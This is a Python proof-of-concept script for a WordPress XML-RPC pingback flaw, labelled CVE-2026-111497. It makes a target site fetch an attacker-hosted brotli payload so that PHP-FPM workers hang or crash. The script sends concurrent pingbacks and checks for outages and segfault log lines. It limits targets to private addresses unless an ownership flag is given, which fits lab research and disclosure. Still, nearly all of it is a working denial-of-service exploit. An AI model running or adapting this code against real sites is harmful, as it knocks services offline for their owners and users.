#!/usr/bin/env python3
"""WordPress XML-RPC pingback PoC for CVE-2026-111497 (lab only).

    python3 poc/pingback_poc.py --target http://localhost:8080 --mode probe
    python3 poc/pingback_poc.py --target http://localhost:8080 --mode hang \\
        --payload-url http://attacker:8080/small.br
    python3 poc/pingback_poc.py --target http://localhost:8080 --mode crash \\
        --payload-url http://attacker:8080/payload.br

The target must resolve to a private/loopback address unless
``--i-own-this-target`` is supplied.  The tool demonstrates availability
impact only; it does not implement RCE.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import dataclasses
import datetime
import http.client
import ipaddress
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from xml.sax.saxutils import escape

UA = "brotli-pingback-lab/1.0"
HEADERS = {"Content-Type": "text/xml; charset=utf-8", "User-Agent": UA}
PINGBACK = """<?xml version="1.0"?>
<methodCall><methodName>pingback.ping</methodName><params>
<param><value><string>{source}</string></value></param>
<param><value><string>{target}</string></value></param>
</params></methodCall>"""
LIST_METHODS = """<?xml version="1.0"?>
<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""


@dataclasses.dataclass
class Result:
    kind: str  # response, http, timeout, error
    status: int | None
    body: str
    elapsed: float

    def short(self) -> str:
        if self.kind in ("response", "http"):
            return f"HTTP {self.status} in {self.elapsed:.1f}s"
        return f"{self.kind} after {self.elapsed:.1f}s"


def request(url: str, data: bytes | None, timeout: float) -> Result:
    req = urllib.request.Request(url, data=data, headers=HEADERS)
    started = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as response:
            body = response.read(8192).decode("utf-8", "replace")
            return Result("response", response.status, body, time.monotonic() - started)
    except urllib.error.HTTPError as error:
        body = error.read(8192).decode("utf-8", "replace")
        return Result("http", error.code, body, time.monotonic() - started)
    except urllib.error.URLError as error:
        elapsed = time.monotonic() - started
        if isinstance(error.reason, (socket.timeout, TimeoutError)):
            return Result("timeout", None, "", elapsed)
        return Result("error", None, str(error.reason), elapsed)
    except (socket.timeout, TimeoutError):
        return Result("timeout", None, "", time.monotonic() - started)
    except (ConnectionError, http.client.HTTPException, OSError) as error:
        return Result("error", None, type(error).__name__, time.monotonic() - started)


def get(url: str, timeout: float = 5.0) -> Result:
    return request(url, None, timeout)


def post(url: str, body: str, timeout: float) -> Result:
    return request(url, body.encode(), timeout)


def target_is_local(host: str) -> bool:
    try:
        infos = socket.getaddrinfo(host, None, proto=socket.IPPROTO_TCP)
    except socket.gaierror:
        return False
    if not infos:
        return False
    for info in infos:
        try:
            address = ipaddress.ip_address(info[4][0].split("%", 1)[0])
        except ValueError:
            return False
        if not (address.is_private or address.is_loopback or address.is_link_local):
            return False
    return True


def safety_check(target: str, authorized: bool) -> None:
    parsed = urllib.parse.urlparse(target)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise SystemExit(f"[-] invalid target: {target}")
    if target_is_local(parsed.hostname):
        return
    if not authorized:
        raise SystemExit(
            "[-] refusing a public target; use --i-own-this-target only with "
            "written authorization"
        )


def probe(target: str) -> int:
    result = post(target.rstrip("/") + "/xmlrpc.php", LIST_METHODS, timeout=8)
    print(f"[*] xmlrpc.php: {result.short()}")
    if result.kind in ("response", "http") and "pingback.ping" in result.body:
        print("[+] pingback.ping is exposed")
        return 0
    print("[-] pingback.ping not found (XML-RPC may be disabled)")
    print(f"    {result.body[:200]}")
    return 1


def ping(index: int, target: str, post_url: str, payload_url: str, timeout: float) -> tuple[int, Result]:
    separator = "&" if "?" in payload_url else "?"
    source = f"{payload_url}{separator}cb={uuid.uuid4().hex}"
    body = PINGBACK.format(source=escape(source), target=escape(post_url))
    print(f"[{index}] -> {source}", flush=True)
    result = post(target.rstrip("/") + "/xmlrpc.php", body, timeout)
    print(f"[{index}] <- {result.short()}", flush=True)
    return index, result


def classify(mode: str, result: Result) -> str:
    if mode == "hang":
        if result.kind == "timeout":
            return "hung"
        if result.kind == "http" and result.status in (500, 502, 503, 504) and result.elapsed >= 4:
            return "killed"
        if result.kind == "error" and result.elapsed >= 4:
            return "killed"
        return "no-hang"

    if result.kind == "error":
        return "crashed"
    if result.kind == "http" and result.status in (502, 504):
        return "crashed"
    if result.kind == "timeout":
        return "timeout"
    return "no-crash"


def show_logs(since: str) -> None:
    command = [
        "docker", "compose", "-p", "brotli-pingback-lab", "logs",
        "--no-color", "--tail=200", f"--since={since}", "wordpress",
    ]
    try:
        output = subprocess.run(command, capture_output=True, text=True, timeout=20).stdout
    except (FileNotFoundError, subprocess.TimeoutExpired) as error:
        print(f"[!] docker logs: {error}")
        return
    needles = ("SIGSEGV", "signal 11", "exited with code 124", "execution timed out", "exited on signal")
    lines = [line for line in output.splitlines() if any(n in line for n in needles)]
    print("\n[*] php-fpm log")
    print("\n".join(f"    {line}" for line in lines[-10:]) if lines else "    (nothing yet)")


def main() -> int:
    parser = argparse.ArgumentParser(description="CVE-2026-111497 pingback PoC")
    parser.add_argument("--target", required=True, help="WordPress base URL")
    parser.add_argument("--payload-url", help="URL WordPress will fetch")
    parser.add_argument("--mode", choices=("probe", "hang", "crash"), default="probe")
    parser.add_argument("--post-url", help="pingback target (default: TARGET/?p=1)")
    parser.add_argument("--workers", type=int, default=1, help="concurrent pingbacks (default 1)")
    parser.add_argument("--timeout", type=float, help="per-request timeout (default 12/30s)")
    parser.add_argument("--show-logs", action="store_true", help="show matching php-fpm log lines")
    parser.add_argument("--i-own-this-target", action="store_true", help="allow a public target")
    args = parser.parse_args()

    safety_check(args.target, args.i_own_this_target)
    if args.mode != "probe" and not args.payload_url:
        parser.error("--payload-url is required for hang/crash")

    if args.mode == "probe":
        return probe(args.target)

    post_url = args.post_url or args.target.rstrip("/") + "/?p=1"
    timeout = args.timeout or (12.0 if args.mode == "hang" else 30.0)
    workers = max(1, min(args.workers, 32))
    since = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0).isoformat().replace("+00:00", "Z")

    print(f"[*] target  : {args.target}")
    print(f"[*] post    : {post_url}")
    print(f"[*] payload : {args.payload_url}")
    print(f"[*] mode    : {args.mode} ({workers} worker(s), timeout {timeout:.0f}s)")

    before = get(args.target.rstrip("/") + "/")
    print(f"[*] site before: {before.short()}\n")

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [
            pool.submit(ping, index, args.target, post_url, args.payload_url, timeout)
            for index in range(1, workers + 1)
        ]
        results = [future.result()[1] for future in concurrent.futures.as_completed(futures)]

    verdicts = [classify(args.mode, result) for result in results]
    counts: dict[str, int] = {}
    for verdict in verdicts:
        counts[verdict] = counts.get(verdict, 0) + 1
    print("\n[*] summary")
    for verdict, count in sorted(counts.items()):
        print(f"    {verdict:10s} {count}")

    success = (
        counts.get("hung", 0) + counts.get("killed", 0) > 0
        if args.mode == "hang"
        else counts.get("crashed", 0) > 0
    )
    print(f"[{'!' if success else '-'}] {'attack signal observed' if success else 'no expected signal'}")

    after = get(args.target.rstrip("/") + "/")
    print(f"[*] site after : {after.short()}")
    if args.mode == "hang":
        if after.kind in ("timeout", "error"):
            time.sleep(5)
            print(f"[*] site +5s   : {get(args.target.rstrip('/') + '/', timeout=8).short()}")
        print("[*] stock FPM has no request timeout; max_execution_time ends a")
        print("    stuck worker in ~30s. Use `make restart` to recover now.")

    if args.show_logs:
        show_logs(since)

    return 0 if success else 1


if __name__ == "__main__":
    raise SystemExit(main())
